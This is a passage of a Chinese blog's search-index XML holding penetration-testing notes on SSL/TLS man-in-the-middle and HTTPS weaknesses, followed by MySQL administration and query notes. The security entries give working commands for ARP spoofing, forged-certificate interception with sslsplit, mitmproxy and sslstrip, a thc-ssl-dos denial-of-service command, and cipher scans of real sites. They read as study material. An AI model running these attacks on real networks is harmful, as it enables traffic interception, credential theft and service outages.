key<br>RESTful应只允许身份认证用户使用PUT,DELETE方法<br>使用随机token防止CSRF攻击</p><p>对用户提交参数过滤,建议部署基于严格白名单的方法<br>报错信息消毒<br>直接对象引用应严格身份验证</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AJAX </tag>
            
            <tag> ZAP </tag>
            
            <tag> DOM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSL_TSL中间人攻击</title>
      <link href="/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2014/05/19/Web_Attacks/SSL_TSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>攻击者位于客户端和服务器通信链路中<br>    ARP        // Data link层,修改MAC地址,ARP Spoof让流量流经中间人<br>    DHCP    // 动态主机配置协议,用来自动获取IP<br>    修改网关<br>    修改DNS<br>    修改HOSTS<br>    ICMP,STP,OSPF<br>加密流量        // 伪造证书解密</p><p><strong>攻击的前提</strong></p><ul><li>客户端已经信任伪造证书颁发机构</li><li>攻击者控制了核发证书颁发机构</li><li>客户端程序禁止了显示证书错误告警信息</li><li>攻击者已经控制客户端,并强制其信任伪造证书</li></ul><h4 id="SSLsplit"><a href="#SSLsplit" class="headerlink" title="SSLsplit"></a><strong>SSLsplit</strong></h4><p>透明SSL/TLS中间人攻击工具<br>对客户端伪造成服务器,对服务器伪装成普通客户端<br>伪装服务器需要伪造证书<br>支持SSL/TLS加密的SMTP,POP3,FTP等通信中间人攻击<br><strong>利用openssl生成证书私钥</strong><br>    <code>openssl genrsa -out ca.key 2048</code><br><strong>利用私钥签名生成证书</strong><br>    <code>openssl reg -new -x509 -days 1096 -key ca.key -out ca.crt</code></p><h4 id="启动路由"><a href="#启动路由" class="headerlink" title="启动路由"></a><strong>启动路由</strong></h4><pre><code>sysctl -w net.ipv4.ip_forward=1cat /proc/sys/net/ipv4/ip_forwardecho 1 &gt; /proc/sys/net/ipv4/ip_forward</code></pre><h4 id="Iptables端口转发规则"><a href="#Iptables端口转发规则" class="headerlink" title="Iptables端口转发规则"></a><strong>Iptables端口转发规则</strong></h4><pre><code>iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-ports 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIRECT --to-ports 8443 #MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIRECT --to-ports 8443 #SMTPSiptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIRECT --to-ports 8443 #IMAPSiptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIRECT --to-ports 8443 #POP3Siptables -t nat -L        //查看nat规则netstat -pantu | grep :80        //查看80端口是否被占用</code></pre><h4 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a><strong>ARP欺骗</strong></h4><pre><code>arpspoof -i eth0 -t 1.1.1.2 -r 1.1.1.1</code></pre><h4 id="启动SSLsplit"><a href="#启动SSLsplit" class="headerlink" title="启动SSLsplit"></a><strong>启动SSLsplit</strong></h4><pre><code>mkdir -p test/logdirsslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</code></pre><p>被害者访问taobao,baidu,mail.163.com<br>查看日志和浏览器证书及证书报错信息<br>安装服务器根证书之后再次访问</p><h4 id="Mitmproxy"><a href="#Mitmproxy" class="headerlink" title="Mitmproxy"></a><strong>Mitmproxy</strong></h4><pre><code>iptables端口转发规则iptables -t nat -F        //清空当前已有规则iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --toport 8080</code></pre><p>Mitmproxy和sslsplit类似,也需要先执行ARP欺骗,且有个BUG,iptables端口只能转发8080有效<br>     mitmproxy -T –host -w mitmproxy.log</p><h4 id="SSLstrip"><a href="#SSLstrip" class="headerlink" title="SSLstrip"></a><strong>SSLstrip</strong></h4><p>与前两种工具不同,将客户端到中间人之间的流量变为明文<br>一样也需要结合ARP欺骗<br>    <code>sslstrip -l 8080</code></p><blockquote><h3 id="SSL-TLS拒绝服务攻击"><a href="#SSL-TLS拒绝服务攻击" class="headerlink" title="SSL/TLS拒绝服务攻击"></a><strong>SSL/TLS拒绝服务攻击</strong></h3></blockquote><ul><li>thc-ssl-dos<br>SSL协商加密对性能开销增加,大量握手请求会导致拒绝服务<br>利用SSL secure Renegotiation特性,在单一TCP连接中生成数千个SSL重连接请求,造成服务器资源过载<br>与流量式拒绝服务攻击不同,thc-ssl-dos可以利用dsl线路打垮30G带宽的服务器<br>服务器平均可以处理300次/秒SSL握手请求<br>对SMTPS,POP3S等服务同样有效<br><code>thc-ssl-dos 1.1.1.1 443 -accept</code></li></ul><p>对策<br>禁用SSL-Renegotiation,使用SSL Accelerator<br>通过修改thc-ssl-dos代码,可以绕过以上对策    </p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 拒绝服务攻击 </tag>
            
            <tag> DoS攻击 </tag>
            
            <tag> ARP欺骗 </tag>
            
            <tag> SSLsplit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPS漏洞及攻击方法</title>
      <link href="/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2014/05/18/Web_Attacks/HTTPS%E6%BC%8F%E6%B4%9E%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<blockquote><h4 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a><strong>HTTPS攻击</strong></h4></blockquote><ul><li><p>全站HTTPS正成为潮流趋势</p><ul><li>淘宝,百度</li></ul></li><li><p>HTTPS的作用</p><ul><li>信息安全3要素: <strong><code>CIA</code></strong> (安全性,完整性,可用性)</li><li>解决的是信息传输过程中数据被篡改,窃取</li><li>加密:对称,非对称,单向</li></ul></li><li><p>HTTPS攻击方法</p><ul><li>降级攻击</li><li>解密攻击(明文,证书伪造)</li><li>协议漏洞,实现方法的漏洞,配置不严格</li></ul></li></ul><p><strong>SSL</strong>(Secure Socket Layer)     <em>安全套接层</em></p><ul><li><p>保证网络通信安全的加密协议</p></li><li><p>1994年由Netscape开发成为统一标准</p></li><li><p>1999年 <strong>TLS</strong>(Transport Layer Security)取代SSL v3</p></li><li><p>近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复</p><ul><li>Heartbleed</li><li>POODIE</li><li>BEAST</li></ul></li><li><p>TLS 当前最新版本 1.2</p></li><li><p>TLS/SSL,HTTPS,HTTP over SSL 通俗上表示同一含义</p></li><li><p>SSL/TLS也被用于其它场景的传输通道加密</p></li><li><p>邮件传输(服务器间,客户端与服务器间)</p></li><li><p>数据库服务器间</p></li><li><p>LDAP身份认证服务器间</p></li><li><p>SSL VPN</p></li><li><p>远程桌面RDP通信过程中的加密和身份认证</p></li></ul><h4 id="Web通信中的SSL加密"><a href="#Web通信中的SSL加密" class="headerlink" title="Web通信中的SSL加密"></a><strong>Web通信中的SSL加密</strong></h4><ul><li>公钥证书(受信任的第三方证书颁发机构签名颁发)<ul><li>VeriSign</li><li>Thawte</li><li>GlobalSign</li><li>Symantec</li></ul></li></ul><h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a><strong>加密过程</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A(握手) --&gt;B(协商加密算法) </span><br><span class="line">B --&gt; C(获取公钥证书)</span><br><span class="line">C --&gt; D(验证公钥证书)</span><br><span class="line">D --&gt; E(交换会话密钥)</span><br><span class="line">E --&gt; F(加密信息传输)</span><br></pre></td></tr></table></figure><h4 id="常见加密算法"><a href="#常见加密算法" class="headerlink" title="常见加密算法"></a><strong>常见加密算法</strong></h4><ul><li><p><strong>非对称加密算法</strong></p><ul><li>Diffie-Hellman key exchange</li><li>Rivest Shamir Adleman (RSA)</li><li>Elliptic Curve Cryptography (ECC)</li></ul></li><li><p><strong>对称加密算法</strong></p><ul><li>Data Encryption Standard (DES) / 3DES </li><li>Advance Encryption Standard (AES) </li><li>International Data Encryption Algorithm (IDEA)</li><li>Rivest Cipher 4 (RC4)<ul><li>WEP̵TLS/SSL̵RDP̵Secure shell</li></ul></li></ul></li></ul><p><strong>单向加密算法</strong></p><table><thead><tr><th>HASH算法</th><th>HASH值长度(bit)</th></tr></thead><tbody><tr><td>MD5</td><td>128</td></tr><tr><td>SHA-1</td><td>160</td></tr><tr><td>SHA-2</td><td>224, 256, 384, 512</td></tr></tbody></table><p>SHA-3已经设计完成,但尚未广泛使用<br>SHA-2是TLS 1.2唯一支持的单向加密算法<br>碰撞攻击针对单向加密算法<br>    两个不同的文件生成相同的HASH值</p><h4 id="SSL的弱点"><a href="#SSL的弱点" class="headerlink" title="SSL的弱点"></a><strong>SSL的弱点</strong></h4><p>SSL是不同的对称,非对称,单向加密算法的组合加密实现(cipher suite)</p><table><thead><tr><th>加密算法</th><th>SSL实现中的用途</th></tr></thead><tbody><tr><td>RAS / Diffle-Hellman</td><td>密钥交换,身份认证</td></tr><tr><td>AES</td><td>加密数据,由RAS/DH完成密钥交换</td></tr><tr><td>HMAC-SHA2</td><td>摘要信息</td></tr></tbody></table><p>服务器端为提供更好的兼容性,选择支持大量过时cipher suite<br>协商过程中强迫降级加密强度<br>现代处理器计算能力可以在可接受的时间内破解过时加密算法<br>购买云计算资源破解</p><h4 id="Openssl"><a href="#Openssl" class="headerlink" title="Openssl"></a><strong>Openssl</strong></h4><ul><li><p>直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">openssl s_client -connect www.baidu.com:443</span><br><span class="line">openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</span><br><span class="line">密钥交换-身份认证-数据加密-HASH算法</span><br><span class="line">openssl s_client -tls1_2 -cipher “NULL,EXPORT,LOW,DES” -connect  www.taobao.com:443</span><br><span class="line">(协商低安全级别cipher suite)</span><br><span class="line">可被破解的cipher suite</span><br><span class="line">openssl ciphers -v &quot;NULL,EXPORT,LOW,DES&quot;</span><br><span class="line">https:&#x2F;&#x2F;www.openssl.org&#x2F;docs&#x2F;apps&#x2F;ciphers.html</span><br></pre></td></tr></table></figure></li><li><p>Openssl需要大量密码学相关知识,命令复杂,结果可读性差</p></li></ul><h4 id="SSLScan"><a href="#SSLScan" class="headerlink" title="SSLScan"></a><strong>SSLScan</strong></h4><ul><li>自动识别SSAL配置错误,过期协议,过时cipher suite和hash算法<ul><li>默认会检查CRIME,heartbleed漏洞</li><li>绿色表示安全,红色黄色需要引起注意</li><li>TLS支持的cipher suite<ul><li><code>sslscan --tlsall www.taobao.com:443</code></li></ul></li><li>分析证书详细数据<ul><li><code>sslscan --show-certificate --no-ciphersuites www.taobao.com:443</code></li></ul></li></ul></li></ul><h4 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a><strong>SSLyze</strong></h4><ul><li>Python语言编写<ul><li>检查SSL过时版本</li><li>检查存在弱点的cipther suite</li><li>扫描多站点时,支持来源文件</li><li>检查是否支持会话恢复</li></ul></li><li><code>sslyze --regular  www.taobao.com:443</code></li></ul><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a><strong>Nmap</strong></h4><pre><code>nmap --script=ssl-enum-ciphers.nse www.taobao.comdpkg -L nmap | grep script | grep ssl    #查看nmap扫描ssl相关脚本</code></pre><ul><li><code>https://www.ssllabs.com/ssltest</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sslscan </tag>
            
            <tag> Heartbleed </tag>
            
            <tag> 加密算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL存储引擎及数据库调优</title>
      <link href="/2014/05/10/MySQL/MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B0%83%E4%BC%98/"/>
      <url>/2014/05/10/MySQL/MySQL%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B0%83%E4%BC%98/</url>
      
        <content type="html"><![CDATA[<h4 id="存储引擎"><a href="#存储引擎" class="headerlink" title="存储引擎"></a><strong>存储引擎</strong></h4><ul><li><p>定义</p><ul><li>是用来处理表的处理器</li></ul></li><li><p>存储引擎基本操作</p><ul><li>查看已有表的存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show create table 表名;# engine&#x3D;...</span><br></pre></td></tr></table></figure></li><li>创建表时指定存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create table 表名(...)engine&#x3D;myisam;</span><br></pre></td></tr></table></figure></li><li>查看所有的存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show engines;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>工作中使用的存储引擎</strong></p><ul><li><p>innodb 和 myisam</p><ul><li><p>innodb特点</p><ul><li>共享表空间  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表名.frm#存储表结构</span><br><span class="line">表名.ibd#存储表记录和索引信息</span><br></pre></td></tr></table></figure></li><li>支持行级锁</li></ul></li><li><p>myisam特点</p><ul><li>独享表空间  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表名.frm #存储表结构</span><br><span class="line">表名.myd#存储表记录</span><br><span class="line">表名.myi#存储索引信息</span><br></pre></td></tr></table></figure></li><li>支持表级锁</li></ul></li></ul></li><li><p>锁</p><ul><li>加锁的目的<ul><li>解决客户端并发访问的冲突问题</li></ul></li><li>锁类型<ul><li>读锁(select)共享锁<ul><li>加读锁之后不能更改表中内容,但可以进行查询</li></ul></li><li>写锁(insert,update,delete)互斥锁,排他锁</li></ul></li><li>锁粒度<ul><li>表级锁</li><li>行级锁</li></ul></li><li>操作完成后会自动释放锁</li></ul></li><li><p><strong>如何决定使用哪种存储引擎</strong></p><ul><li>执行查询操作多的表使用myisam存储引擎(使用innodb浪费资源)</li><li>执行写操作比较多的表使用innodb存储引擎</li></ul></li><li><p><strong>如何修改表的默认存储引擎</strong></p><ul><li>通过修改mysql配置文件更改默认存储引擎<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;</span><br><span class="line"></span><br><span class="line">vi mysqld.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">defalut-storage-engini &#x3D; myisam</span><br><span class="line"></span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart</span><br></pre></td></tr></table></figure></li></ul></li><li><p>memory存储引擎</p><ul><li>memory: 表记录存储在内存中  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">表名.frm  存储表结构</span><br><span class="line"># 表记录存储在内存中</span><br><span class="line"># 服务重启之后表结构在,表记录都消失</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h4 id="MySQL调优"><a href="#MySQL调优" class="headerlink" title="MySQL调优"></a><strong>MySQL调优</strong></h4><ul><li><p>选择合适的存储引擎</p><ul><li>经常用来读的表使用myisam存储引擎</li><li>其余的表都用innodb存储引擎</li></ul></li><li><p>SQL语句调优(尽量避免全表扫描)</p><ul><li>在select where order by常涉及到的字段上建立索引</li><li>where子句中不使用 !=, 否则将放弃使用索引进行全表扫描</li><li>尽量避免用NULL值判断,否则会全表扫描</li><li>尽量避免 or 来连接条件,导致全表扫描</li><li>模糊查询尽量避免使用前置 % ,导致全表扫描</li><li>尽量避免 in 和 not in,导致全表扫描</li><li>尽量避免使用 select * …, 要用具体的字段列表代替 * , 不要返回用不到的任何字段</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> memory </tag>
            
            <tag> innodb </tag>
            
            <tag> myisam </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL用户账户管理及数据备份还原</title>
      <link href="/2014/05/10/MySQL/MySQL%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/"/>
      <url>/2014/05/10/MySQL/MySQL%E7%94%A8%E6%88%B7%E8%B4%A6%E6%88%B7%E7%AE%A1%E7%90%86%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%A4%87%E4%BB%BD%E8%BF%98%E5%8E%9F/</url>
      
        <content type="html"><![CDATA[<h4 id="MySQL用户账户管理"><a href="#MySQL用户账户管理" class="headerlink" title="MySQL用户账户管理"></a><strong>MySQL用户账户管理</strong></h4><ul><li><p><strong>开启MySQL远程连接</strong></p><ul><li>获取root权限<ul><li>sudo -i</li></ul></li><li>cd到配置文件所在路径<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;</span><br><span class="line">vi mysqld.cnf</span><br><span class="line">#bind-address &#x3D; 127.0.0.1</span><br></pre></td></tr></table></figure></li><li>重启mysql服务<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql restart</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>添加授权用户</strong></p><ul><li>使用root用户连接到服务器<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p123456</span><br></pre></td></tr></table></figure></li><li>添加新的授权用户<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">create user &quot;用户名&quot;@&quot;IP地址&quot; identified by &quot;密码&quot;;</span><br><span class="line">create user &quot;cat&quot;@&quot;%&quot; identified by &quot;123456&quot;;</span><br></pre></td></tr></table></figure></li><li>IP地址的表示方式:<ul><li>% 表示用户可以从任何地址连接到服务器</li><li>localhost 用户只能从本地连接</li><li>指定一个IP 表示用户只能从此IP连接到服务器<ul><li><strong>给用户授权</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grant 权限列表 on 库.表 to &quot;用户名&quot;@&quot;IP地址&quot; with grant option;</span><br><span class="line">grant all privileges on *.* to &quot;cat&quot;@&quot;%&quot; with grant option;</span><br></pre></td></tr></table></figure></li></ul></li><li>权限列表:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select,update,delete,insert,alter,drop,create,...</span><br><span class="line">库.表: *.* 表示所有库的所有表</span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p><strong>删除授权用户</strong></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">drop user &quot;用户名&quot;@&quot;IP地址&quot;;</span><br><span class="line">drop user &quot;cat&quot;@&quot;%&quot;;</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据备份-mysqldump-在linux终端中操作"><a href="#数据备份-mysqldump-在linux终端中操作" class="headerlink" title="数据备份 (mysqldump,在linux终端中操作)"></a><strong>数据备份</strong> (mysqldump,在linux终端中操作)</h4><ul><li>命令格式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p 源库名 &gt; 路径&#x2F;xxx.sql</span><br></pre></td></tr></table></figure></li><li>示例  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db2 &gt; &#x2F;root&#x2F;db2.sql</span><br></pre></td></tr></table></figure></li><li>源库名的表示方式  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--all-databases#备份所有库</span><br><span class="line">库名#备份单个库</span><br><span class="line">-B 库1 库2 ...#备份多个库</span><br><span class="line">库名 表1 表2 ...#备份指定库的指定表</span><br></pre></td></tr></table></figure></li></ul><h4 id="数据恢复"><a href="#数据恢复" class="headerlink" title="数据恢复"></a><strong>数据恢复</strong></h4><ul><li><p>命令格式</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名 -p 目标库名 &lt; 路径&#x2F;xxx.sql</span><br></pre></td></tr></table></figure></li><li><p>示例</p><ul><li>先备份库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db2 &gt; db2.sql</span><br></pre></td></tr></table></figure></li><li>删除库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop database db2;</span><br></pre></td></tr></table></figure></li><li>先创建空库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create database db2 default charset&#x3D;utf8;</span><br></pre></td></tr></table></figure></li><li>恢复命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p db2 &lt; db2.sql</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>备份分为 完全备份 和 增量备份</strong></p><ul><li>完全备份: mysqldump</li><li>增量备份: binlog日志, xbackup工具</li></ul></li><li><p><strong>从所有库的备份文件中恢复某一个库</strong> (–one-database)</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u用户名 -p --one-database 目标库名 &lt; all_mysql.sql</span><br><span class="line">mysql -uroot -p --one-database db2 &lt; all_mysql.sql</span><br></pre></td></tr></table></figure><ul><li>注意<ul><li>恢复库时库中新增的表不会删除</li><li>恢复时必须先创建空库</li></ul></li></ul></li></ul><h4 id="事务和事务回滚"><a href="#事务和事务回滚" class="headerlink" title="事务和事务回滚"></a><strong>事务和事务回滚</strong></h4><ul><li><p>定义</p><ul><li>一件事从开始发生到结束的整个过程</li></ul></li><li><p>作用</p><ul><li>确保数据的一致性</li></ul></li><li><p>事务和事务回滚的应用</p><pre><code>* mysql中默认sql语句会自动commit到数据库<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;autocommit&quot;;</span><br></pre></td></tr></table></figure>* 开启事务    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; start transaction;</span><br><span class="line">mysql&gt; ... SQL命令</span><br><span class="line"># 此时autocommit被禁用,SQL命令不会对数据库中数据做修改</span><br></pre></td></tr></table></figure>* 终止事务    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; commit;</span><br><span class="line">#或者回滚</span><br><span class="line">mysql&gt; rollback;</span><br></pre></td></tr></table></figure>* 注意    * 事务回滚rollback只针对于对表记录的操作,增,删,改,对创建库,创建表的操作无效</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> mysqldump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL高级查询语法</title>
      <link href="/2014/05/09/MySQL/MySQL%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2/"/>
      <url>/2014/05/09/MySQL/MySQL%E9%AB%98%E7%BA%A7%E6%9F%A5%E8%AF%A2/</url>
      
        <content type="html"><![CDATA[<h4 id="嵌套查询-子查询"><a href="#嵌套查询-子查询" class="headerlink" title="嵌套查询 (子查询)"></a><strong>嵌套查询</strong> (子查询)</h4><ul><li>定义<ul><li>把内层的查询结果作为外层的查询条件</li></ul></li><li>示例<ul><li>把uid的值小于 uid 平均值的用户和uid号显示出来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select username,uid from userinfo</span><br><span class="line">where uid &lt; (select avg(uid) from userinfo);</span><br></pre></td></tr></table></figure></li></ul></li></ul><h4 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a><strong>连接查询</strong></h4><ul><li><p><strong>内连接</strong></p><ul><li>定义<ul><li>从表中删除与其它被连接的表中没有匹配到的行</li></ul></li><li>语法格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 字段名列表 from 表1</span><br><span class="line">inner join 表2 on 条件 inner join 表3 条件;</span><br></pre></td></tr></table></figure></li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#显示省市详细信息</span><br><span class="line">select sheng.s_name,city.c_name from sheng</span><br><span class="line">inner join city</span><br><span class="line">on sheng.s_id &#x3D; city.cfather_id;</span><br><span class="line"></span><br><span class="line">#显示省市县详细信息</span><br><span class="line">select sheng.s_name,city.c_name.xian.x_name from sheng</span><br><span class="line">inner join city on sheng.s_id&#x3D;city.cfather_id</span><br><span class="line">inner join xian on city.c_id&#x3D;xian.xfather_id;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>外连接</strong></p><ul><li>左连接<ul><li>定义<ul><li>以左表为主显示查询结果</li></ul></li><li>语法格式<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select 字段名列表 from 表1</span><br><span class="line">left join 表2 on 条件;</span><br></pre></td></tr></table></figure></li><li>示例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select sheng.s_name,city.c_name from sheng</span><br><span class="line">left join city</span><br><span class="line">on sheng.s_id&#x3D;city.cfather_id;</span><br><span class="line"></span><br><span class="line">select sheng.s_name,city.c_name.xian.x_name from sheng</span><br><span class="line">left join city on sheng.s_id&#x3D;city.cfather_id</span><br><span class="line">left join city on city.c_id&#x3D;xian.xfather_id;</span><br></pre></td></tr></table></figure></li></ul></li><li>右连接<ul><li>定义<ul><li>用法同左连接,以右表为主显示查询结果</li></ul></li></ul></li></ul></li></ul><h4 id="多表查询"><a href="#多表查询" class="headerlink" title="多表查询"></a><strong>多表查询</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select 字段名列表 from 表名列表;#笛卡尔积</span><br><span class="line">select 字段名列表 from 表名列表 where 条件;</span><br><span class="line">#等同于 内连接 inner join</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DBMS </category>
          
          <category> MySQL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> SQL查询 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL索引及数据导入导出</title>
